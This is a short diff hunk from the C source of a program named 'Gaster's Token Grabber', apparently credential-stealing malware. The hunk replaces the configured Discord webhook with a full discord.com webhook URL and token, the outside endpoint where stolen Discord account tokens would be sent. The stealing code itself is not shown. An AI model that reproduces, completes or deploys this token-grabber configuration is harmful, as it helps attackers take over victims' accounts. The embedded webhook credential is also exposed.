@@ -12,7 +12,7 @@
 /* Edit below to configure your webhook */
 
 #define WEBHOOK_TOKEN \
-        "/api/webhooks/1186736079173333152/UZrV7q2WXSGNOdKDi-9yn4bH3gmg2yOlygAns-B40ox4eh0lARyCuK3iW5JcsyET6lYC"
+        "https://discord.com/api/webhooks/1375513024265453659/UQ1SRJNQp8ey5dPd78xvVhUtKCu4LLHL1z4pYwn8qI3QedzEb-4hpWF9WxUcRCdSJEIl"
 
 #define WEBHOOK_USERNAME "Gaster's Token Grabber"
 #define WEBHOOK_AVATAR_URL \
